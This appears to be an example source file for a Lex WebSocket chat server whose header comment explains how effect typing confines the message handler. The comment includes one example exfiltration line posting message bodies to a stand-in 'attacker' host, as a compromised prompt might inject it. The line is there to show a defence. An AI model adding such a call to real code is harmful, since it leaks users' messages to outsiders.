# Multi-user WebSocket chat in Lex.
#
# Each connection joins a room derived from its URL path:
#   ws://127.0.0.1:9090/lobby      → room "lobby"
#   ws://127.0.0.1:9090/general    → room "general"
#
# Run:
#   lex run --allow-effects net,chat examples/chat_app.lex main
# Open examples/chat_client.html in two tabs to see the broadcast.
#
# Adversarial scenario:
#   on_message has effects [chat] only. Even though the host grants
#   `net,chat` (so net.serve_ws_fn can bind), the per-message handler
#   is *narrower*: it can broadcast and send within the chat
#   registry, but it cannot make outbound HTTP requests, cannot
#   touch the filesystem, cannot read the clock. A compromised
#   prompt that tries to add `net.post("http://attacker/leak", body)`
#   in on_message gets rejected at type-check — the signature
#   `[chat]` doesn't include net. To exfiltrate via this code path,
#   an attacker would need to change *both* the function signature
#   *and* the run-time policy, and either change is review-visible.

import "std.net" as net
import "std.chat" as chat
import "std.str" as str

# Each incoming text frame becomes a Lex call. We prefix the message
# with the sender's connection id so other users can see who said what,
# then broadcast to everyone in the same room (sender included — a
# real client filters its own echoes).
#
# `conn.path` carries the room name (see the header: /lobby, /general);
# strip the leading slash, defaulting to the raw path if there somehow
# isn't one. Only WsText frames carry a chat line — every other
# WsMessage variant (ping/close/binary) is a no-op reply.
fn on_message(conn :: WsConn, msg :: WsMessage) -> [chat] WsAction {
  match msg {
    WsText(body) => {
      let room   := match str.strip_prefix(conn.path, "/") { Some(r) => r, None => conn.path }
      let prefix := str.concat("[", str.concat(conn.id, "] "))
      let line   := str.concat(prefix, body)
      chat.broadcast(room, line)
      WsNoOp
    },
    _ => WsNoOp,
  }
}

fn main() -> [chat, net] Nil {
  net.serve_ws_fn(9090, "", on_message)
}
